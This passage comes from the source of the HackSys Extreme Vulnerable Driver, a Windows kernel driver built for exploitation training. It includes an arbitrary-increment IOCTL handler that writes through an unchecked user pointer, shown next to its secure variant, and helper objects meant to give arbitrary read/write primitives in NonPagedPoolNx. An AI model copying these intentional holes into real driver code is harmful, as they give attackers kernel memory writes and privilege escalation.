typedef struct _UNINITIALIZED_MEMORY_STACK
{
    unsigned long Value;
    FunctionPointer Callback;
    unsigned long Buffer[58];
} UNINITIALIZED_MEMORY_STACK, *PUNINITIALIZED_MEMORY_STACK;


//
// Function Definitions
//

void
UninitializedMemoryStackObjectCallback(void);

int trigger_uninitialized_memory_stack(void *user_buffer, size_t size);

#endif  // !__UNINITIALIZED_MEMORY_STACK_H__

```

`Driver/HEVD/Windows/ArbitraryIncrement.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryIncrement.c

Abstract:
    This module implements the functions to demonstrate
    Arbitrary Increment vulnerability.

--*/

#include "ArbitraryIncrement.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerArbitraryIncrement)
#pragma alloc_text(PAGE, ArbitraryIncrementIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the Arbitrary Increment Vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerArbitraryIncrement(
    _In_ PVOID UserBuffer
)
{
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(PULONG_PTR), (ULONG)__alignof(PULONG_PTR));

        //
        // Grab the user pointer
        //

        PCHAR UserPointerToIncrementValue = *(PCHAR*)UserBuffer;

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserPointerToIncrementValue: 0x%p\n", UserPointerToIncrementValue);
        DbgPrint("[+] Value before increment: 0x%zX\n", *UserPointerToIncrementValue);

#ifdef SECURE

        //
        // Secure Note: This is secure because the developer is properly validating if 
        // 'UserPointerToIncrementValue' resides in User mode by calling ProbeForWrite() routine before
        // performing the increment operation
        //

        ProbeForWrite(UserPointerToIncrementValue, sizeof(PCHAR), (ULONG)__alignof(CHAR));

        (*(PCHAR)UserPointerToIncrementValue)++;
#else
        DbgPrint("[+] Triggering Arbitrary Increment\n");

        //
        // Vulnerability Note: This is a vanilla Arbitrary Increment vulnerability
        // because the developer is incrementing value pointed by 'UserPointerToIncrementValue'
        // without properly validating if it resides in User mode
        //

        (*(PCHAR)UserPointerToIncrementValue)++;
#endif

        DbgPrint("[+] Value after increment: 0x%zX\n", *UserPointerToIncrementValue);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Arbitrary Increment Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
ArbitraryIncrementIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserBuffer)
    {
        Status = TriggerArbitraryIncrement(UserBuffer);
    }

    return Status;
}

```

`Driver/HEVD/Windows/ArbitraryIncrement.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryIncrement.h

Abstract:
    This module implements the data structures for
    arbitrary increment module.

--*/

#pragma once

#ifndef __ARBITRARY_INCREMENT_H__
#define __ARBITRARY_INCREMENT_H__

#include "Common.h"


//
// Function Definitions
//

NTSTATUS
TriggerArbitraryIncrement(
    _In_ PVOID UserBuffer
);

#endif // !__ARBITRARY_INCREMENT_H__

```

`Driver/HEVD/Windows/ArbitraryReadWriteHelperNonPagedPoolNx.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryReadWriteHelperNonPagedPoolNx.c

Abstract:
    This module implements the helper functions to
    achieve arbitrary read write primitive in NonPagedPoolNx.

--*/

#include "ArbitraryReadWriteHelperNonPagedPoolNx.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, GetFreeIndex)
#pragma alloc_text(PAGE, GetIndexFromPointer)
#pragma alloc_text(PAGE, DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx)
#pragma alloc_text(PAGE, CreateArbitraryReadWriteHelperObjectNonPagedPoolNx)
#pragma alloc_text(PAGE, SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx)
#pragma alloc_text(PAGE, GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx)
#pragma alloc_text(PAGE, DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler)
#pragma alloc_text(PAGE, CreateArbitraryReadWriteHelperObjectNonPagedPoolNxIoctlHandler)
#pragma alloc_text(PAGE, SetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler)
#pragma alloc_text(PAGE, GetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler)
#endif // ALLOC_PRAGMA


PARW_HELPER_OBJECT_NON_PAGED_POOL_NX g_ARWHelperObjectNonPagedPoolNx[MAX_OBJECT_COUNT] = { 0 };


/// <summary>
/// Get Free Index in g_ARWHelperObjectNonPagedPoolNx
/// </summary>
/// <returns>INT</returns>
INT
GetFreeIndex(
    VOID
)
{
    INT i = 0;
    INT FreeIndex = STATUS_INVALID_INDEX;

    for (i = 0; i < MAX_OBJECT_COUNT; i++)
    {
        if (!g_ARWHelperObjectNonPagedPoolNx[i])
        {
            FreeIndex = i;
            break;
        }
    }

    return FreeIndex;
}


/// <summary>
/// Get Index in g_ARWHelperObjectNonPagedPoolNx From Pointer 
/// </summary>
/// <param name="Pointer">Pointer</param>
/// <returns>INT</returns>
INT
GetIndexFromPointer(
    _In_ PVOID Pointer
)
{
    INT i = 0;
    INT FreeIndex = STATUS_INVALID_INDEX;

    if (!Pointer)
    {
        return FreeIndex;
    }

    for (i = 0; i < MAX_OBJECT_COUNT; i++)
    {
        if (g_ARWHelperObjectNonPagedPoolNx[i] == Pointer)
        {
            FreeIndex = i;
            break;
        }
    }

    return FreeIndex;
}


/// <summary>
/// Create Arbitrary Read Write Helper Object in NonPagedPoolNx
/// </summary>
/// <param name="HelperObjectIo">The pointer to ARW_HELPER_OBJECT_IO structure</param>
/// <returns>INT</returns>
NTSTATUS
CreateArbitraryReadWriteHelperObjectNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
)
{
    PVOID Name = NULL;
    SIZE_T Length = 0;
    NTSTATUS Status = STATUS_SUCCESS;
    INT FreeIndex = STATUS_INVALID_INDEX;
    PARW_HELPER_OBJECT_NON_PAGED_POOL_NX ARWHelperObject = NULL;

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(HelperObjectIo, sizeof(ARW_HELPER_OBJECT_IO), (ULONG)__alignof(UCHAR));

        //
        // Make a local copy of the data structure to avoid race conditions
        //

        Length = HelperObjectIo->Length;

        DbgPrint("[+] Name Length: 0x%zX\n", Length);

        //
        // Get a free index
        //

        FreeIndex = GetFreeIndex();

        if (FreeIndex == STATUS_INVALID_INDEX)
        {
            //
            // Failed to get a free index
            //

            Status = STATUS_INVALID_INDEX;
            DbgPrint("[-] Unable to find FreeIndex: 0x%X\n", Status);

            return Status;
        }
        else
        {
            DbgPrint("[+] FreeIndex: 0x%X\n", FreeIndex);
        }

        DbgPrint("[+] Allocating Pool chunk for ARWHelperObject\n");

        //
        // Allocate Pool chunk for ARWHelperObject
        //

        ARWHelperObject = (PARW_HELPER_OBJECT_NON_PAGED_POOL_NX)ExAllocatePoolWithTag(
            NonPagedPoolNx,
            sizeof(ARW_HELPER_OBJECT_NON_PAGED_POOL_NX),
            POOL_TAG
        );

        if (!ARWHelperObject)
        {
            //
            // Unable to allocate Pool chunk for ARWHelperObject
            //

            DbgPrint("[-] Unable to allocate Pool chunk for ARWHelperObject\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] ARWHelperObject Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] ARWHelperObject Pool Type: %s\n", STRINGIFY(NonPagedPoolNx));
            DbgPrint("[+] ARWHelperObject Pool Size: 0x%zX\n", sizeof(ARW_HELPER_OBJECT_NON_PAGED_POOL_NX));
            DbgPrint("[+] ARWHelperObject Pool Chunk: 0x%p\n", ARWHelperObject);
        }

        DbgPrint("[+] Allocating Pool chunk for Name\n");

        //
        // Allocate Pool chunk for Name
        //

        Name = ExAllocatePoolWithTag(NonPagedPoolNx, Length, POOL_TAG);

        if (!Name)
        {
            //
            // Unable to allocate Pool chunk for Name
            //

            DbgPrint("[-] Unable to allocate Pool chunk for Name\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Name Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Name Pool Type: %s\n", STRINGIFY(NonPagedPoolNx));
            DbgPrint("[+] Name Pool Size: 0x%zX\n", Length);
            DbgPrint("[+] Name Pool Chunk: 0x%p\n", Name);
        }

        //
        // Initialize the kernel buffer
        //

        RtlFillMemory(Name, (SIZE_T)Length, 0);

        //
        // Initialize the kernel structure
        //

        ARWHelperObject->Name = Name;
        ARWHelperObject->Length = Length;

        DbgPrint("[+] ARWHelperObject->Name: 0x%p\n", ARWHelperObject->Name);
        DbgPrint("[+] ARWHelperObject->Length: 0x%zX\n", ARWHelperObject->Length);

        g_ARWHelperObjectNonPagedPoolNx[FreeIndex] = ARWHelperObject;

        //
        // Verify if the buffer resides in user mode
        //

        ProbeForWrite(HelperObjectIo, sizeof(ARW_HELPER_OBJECT_IO), (ULONG)__alignof(UCHAR));

        //
        // Write the object address to user mode for book keeping
        //

        HelperObjectIo->HelperObjectAddress = ARWHelperObject;

        DbgPrint("[+] HelperObjectIo->HelperObjectAddress: 0x%p\n", HelperObjectIo->HelperObjectAddress);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Set Arbitrary Read Write Helper Object Name in NonPagedPoolNx
/// </summary>
/// <param name="HelperObjectIo">The pointer to ARW_HELPER_OBJECT_IO structure</param>
/// <returns>INT</returns>
NTSTATUS
SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
)
{
    PVOID Name = NULL;
    PVOID HelperObjectAddress = NULL;
    INT Index = STATUS_INVALID_INDEX;
    NTSTATUS Status = STATUS_SUCCESS;

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(HelperObjectIo, sizeof(ARW_HELPER_OBJECT_IO), (ULONG)__alignof(UCHAR));

        //
        // Make a local copy of the data structure to avoid race conditions
        //

        Name = HelperObjectIo->Name;
        HelperObjectAddress = HelperObjectIo->HelperObjectAddress;

        DbgPrint("[+] HelperObjectIo->Name: 0x%p\n", Name);
        DbgPrint("[+] HelperObjectIo->HelperObjectAddress: 0x%p\n", HelperObjectAddress);

        //
        // Get index by pointer
        //

        Index = GetIndexFromPointer(HelperObjectAddress);

        if (Index == STATUS_INVALID_INDEX)
        {
            //
            // Failed to find index from pointer
            //

            DbgPrint("[-] Unable to find index from pointer: 0x%p\n", HelperObjectAddress);

            Status = STATUS_INVALID_INDEX;
            return Status;
        }
        else
        {
            DbgPrint("[+] Index: 0x%X Pointer: 0x%p\n", Index, HelperObjectAddress);
        }

        if (Name && g_ARWHelperObjectNonPagedPoolNx[Index]->Length)
        {
            //
            // Verify if the buffer resides in user mode
            //

            ProbeForRead(
                Name,
                g_ARWHelperObjectNonPagedPoolNx[Index]->Length,
                (ULONG)__alignof(UCHAR)
            );

            //
            // Copy the name from user buffer to kernel object name buffer
            //

            DbgPrint(
                "[+] Copying src: 0x%p dst: 0x%p len: 0x%zX\n",
                Name,
                g_ARWHelperObjectNonPagedPoolNx[Index]->Name,
                g_ARWHelperObjectNonPagedPoolNx[Index]->Length
            );

            RtlCopyMemory(
                g_ARWHelperObjectNonPagedPoolNx[Index]->Name,
                Name,
                g_ARWHelperObjectNonPagedPoolNx[Index]->Length
            );
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Get Arbitrary Read Write Helper Object Name in NonPagedPoolNx
/// </summary>
/// <param name="HelperObjectIo">The pointer to ARW_HELPER_OBJECT_IO structure</param>
/// <returns>INT</returns>
NTSTATUS
GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
)
{
    PVOID Name = NULL;
    PVOID HelperObjectAddress = NULL;
    INT Index = STATUS_INVALID_INDEX;
    NTSTATUS Status = STATUS_SUCCESS;

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(HelperObjectIo, sizeof(ARW_HELPER_OBJECT_IO), (ULONG)__alignof(UCHAR));

        //
        // Make a local copy of the data structure to avoid race conditions
        //

        Name = HelperObjectIo->Name;
        HelperObjectAddress = HelperObjectIo->HelperObjectAddress;

        DbgPrint("[+] HelperObjectIo->Name: 0x%p\n", Name);
        DbgPrint("[+] HelperObjectIo->HelperObjectAddress: 0x%p\n", HelperObjectAddress);

        //
        // Get index by pointer
        //

        Index = GetIndexFromPointer(HelperObjectAddress);

        if (Index == STATUS_INVALID_INDEX)
        {
            //
            // Failed to find index from pointer
            //

            DbgPrint("[-] Unable to find index from pointer: 0x%p\n", HelperObjectAddress);

            Status = STATUS_INVALID_INDEX;
            return Status;
        }
        else
        {
            DbgPrint("[+] Index: 0x%X Pointer: 0x%p\n", Index, HelperObjectAddress);
        }

        if (g_ARWHelperObjectNonPagedPoolNx[Index]->Name && g_ARWHelperObjectNonPagedPoolNx[Index]->Length)
        {
            //
            // Verify if the buffer resides in user mode
            //

            ProbeForWrite(
                Name,
                g_ARWHelperObjectNonPagedPoolNx[Index]->Length,
                (ULONG)__alignof(UCHAR)
            );

            //
            // Copy the name from object name buffer to user buffer
            //

            DbgPrint(
                "[+] Copying src: 0x%p dst: 0x%p len: 0x%zX\n",
                g_ARWHelperObjectNonPagedPoolNx[Index]->Name,
                Name,
                g_ARWHelperObjectNonPagedPoolNx[Index]->Length
            );

            RtlCopyMemory(
                Name,
                g_ARWHelperObjectNonPagedPoolNx[Index]->Name,
                g_ARWHelperObjectNonPagedPoolNx[Index]->Length
            );
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Delete Arbitrary Read Write Helper Object in NonPagedPoolNx
/// </summary>
/// <param name="HelperObjectIo">The pointer to ARW_HELPER_OBJECT_IO structure</param>
/// <returns>INT</returns>
NTSTATUS
DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
)
{
    PVOID HelperObjectAddress = NULL;
    INT Index = STATUS_INVALID_INDEX;
    NTSTATUS Status = STATUS_SUCCESS;

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(HelperObjectIo, sizeof(ARW_HELPER_OBJECT_IO), (ULONG)__alignof(UCHAR));

        //
        // Make a local copy of the data structure to avoid race conditions
        //

        HelperObjectAddress = HelperObjectIo->HelperObjectAddress;

        DbgPrint("[+] HelperObjectIo->HelperObjectAddress: 0x%p\n", HelperObjectAddress);

        //
        // Get index by pointer
        //

        Index = GetIndexFromPointer(HelperObjectAddress);

        if (Index == STATUS_INVALID_INDEX)
        {
            //
            // Failed to find index from pointer
            //

            DbgPrint("[-] Unable to find index from pointer: 0x%p\n", HelperObjectAddress);

            Status = STATUS_INVALID_INDEX;
            return Status;
        }
        else
        {
            DbgPrint("[+] Index: 0x%X Pointer: 0x%p\n", Index, HelperObjectAddress);
        }

        if (g_ARWHelperObjectNonPagedPoolNx[Index]->Name)
        {
            //
            // Free the pool memory for name buffer
            //

            ExFreePoolWithTag(g_ARWHelperObjectNonPagedPoolNx[Index]->Name, POOL_TAG);
        }

        //
        // Free up the object at index
        //

        ExFreePoolWithTag(g_ARWHelperObjectNonPagedPoolNx[Index], POOL_TAG);

        //
        // Set to NULL to avoid dangling pointer
        //

        g_ARWHelperObjectNonPagedPoolNx[Index] = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Create Arbitrary Read Write Helper Object Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
CreateArbitraryReadWriteHelperObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PARW_HELPER_OBJECT_IO HelperObjectIo = NULL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    HelperObjectIo = (PARW_HELPER_OBJECT_IO)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (HelperObjectIo)
    {
        Status = CreateArbitraryReadWriteHelperObjectNonPagedPoolNx(HelperObjectIo);
    }

    return Status;
}


/// <summary>
/// Set Arbitrary Read Write Helper Object Name Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
SetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PARW_HELPER_OBJECT_IO HelperObjectIo = NULL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    HelperObjectIo = (PARW_HELPER_OBJECT_IO)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (HelperObjectIo)
    {
        Status = SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(HelperObjectIo);
    }

    return Status;
}


/// <summary>
/// Get Arbitrary Read Write Helper Object Name Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
GetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PARW_HELPER_OBJECT_IO HelperObjectIo = NULL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    HelperObjectIo = (PARW_HELPER_OBJECT_IO)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (HelperObjectIo)
    {
        Status = GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(HelperObjectIo);
    }

    return Status;
}


/// <summary>
/// Delete Arbitrary Read Write Helper Object Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PARW_HELPER_OBJECT_IO HelperObjectIo = NULL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    HelperObjectIo = (PARW_HELPER_OBJECT_IO)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (HelperObjectIo)
    {
        Status = DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx(HelperObjectIo);
    }

    return Status;
}

```

`Driver/HEVD/Windows/ArbitraryReadWriteHelperNonPagedPoolNx.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryReadWriteHelperNonPagedPoolNx.h

Abstract:
    This module implements the data structures for
    arbitrary read write helper in NonPagedPoolNx module.

--*/

#pragma once

#ifndef __ARBITRARY_READ_WRITE_HELPER_NON_PAGED_POOL_NX_H__
#define __ARBITRARY_READ_WRITE_HELPER_NON_PAGED_POOL_NX_H__

#include "Common.h"


//
// Defines
//

#define MAX_OBJECT_COUNT 65535
#define STATUS_INVALID_INDEX ((NTSTATUS)-1L)


//
// Structures
//

typedef struct _ARW_HELPER_OBJECT_NON_PAGED_POOL_NX
{
    PVOID Name;
    SIZE_T Length;
} ARW_HELPER_OBJECT_NON_PAGED_POOL_NX, *PARW_HELPER_OBJECT_NON_PAGED_POOL_NX;

typedef struct _ARW_HELPER_OBJECT_IO
{
    PVOID HelperObjectAddress;
    PVOID Name;
    SIZE_T Length;
} ARW_HELPER_OBJECT_IO, *PARW_HELPER_OBJECT_IO;


//
// Function Definitions
//

INT
GetFreeIndex(
    VOID
);

INT
GetIndexFromPointer(
    _In_ PVOID Pointer
);

NTSTATUS
CreateArbitraryReadWriteHelperObjectNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
);

NTSTATUS
SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
);

NTSTATUS
GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
);

NTSTATUS
DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
);

#endif  // !__ARBITRARY_READ_WRITE_HELPER_NON_PAGED_POOL_NX_H__

```

